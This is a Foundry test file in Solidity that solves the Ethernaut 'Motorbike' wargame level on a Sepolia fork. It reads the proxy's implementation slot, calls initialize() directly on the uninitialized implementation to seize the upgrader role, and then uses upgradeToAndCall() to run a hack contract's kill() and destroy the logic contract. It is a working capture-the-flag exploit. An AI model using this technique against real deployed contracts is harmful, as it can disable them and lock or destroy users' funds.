//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import {hackMotobike} from "../../src/ethernaut/motorbike.sol";

// in this section we will take the ownership (upgrader) from the address of the implementation contract
// the idea here is to call the function initialize from that implemention directly and not from it's proxy
//call that initialize() function ,
// call upgradeToAndCall() passing the address of the contrac hack you create and passing the signature to call
///the kill() function from the hack contract

contract hackMotorbike is Test {
    address Proxy = 0xcE4aaf794EA88E53B5168Fe59309f022A0d3385B;
    string sepolia_url = vm.envString("sepolia_url");
    uint fork;
    hackMotobike hack;

    function setUp() public {
        vm.createFork(sepolia_url);
        vm.selectFork(fork);
        hack = new hackMotobike();
    }

    function getLogiAddress() public view returns (address) {
        // get the address by using the sload opcode :

        bytes32 slotLocation = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 value = vm.load(Proxy, slotLocation);

        address implementation = address(uint160(uint(value)));
        return implementation;
    }

    function test_motorbike() public {
        assertEq(vm.activeFork(), fork);
        // first get the address of the implementation :
        vm.startPrank(address(123));
        address logic = getLogiAddress();
        //check if the upgrader is 0:
        (, bytes memory data) = logic.call(
            abi.encodeWithSignature("upgrader()")
        );
        address upgrader = abi.decode(data, (address));
        assertEq(upgrader, address(0), "the owner not the address zero");
        // now callthe function initialize() from the logic contract;
        (bool ok, ) = logic.call(abi.encodeWithSignature("initialize()"));
        assertTrue(ok);
        (, bytes memory Data) = logic.call(
            abi.encodeWithSignature("upgrader()")
        );
        address newupgrader = abi.decode(Data, (address));
        assertEq(newupgrader, address(123));

        // while we are the upgrader we can call the upgradeToAndCall() function passing the hack contract address
        // that already deployed and calling the function kill in our hack contract
        bytes memory kill = abi.encodeWithSignature("kill()");
        (bool seccess, ) = logic.call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(hack),
                kill
            )
        );
        assertTrue(seccess);
        vm.expectRevert();
        (bool okBb, ) = Proxy.staticcall(
            abi.encodeWithSignature("horsePower()")
        );
        assertFalse(okBb);
        console.log("+__+ The Contract Get Fucked Successfully +__+");
    }
}
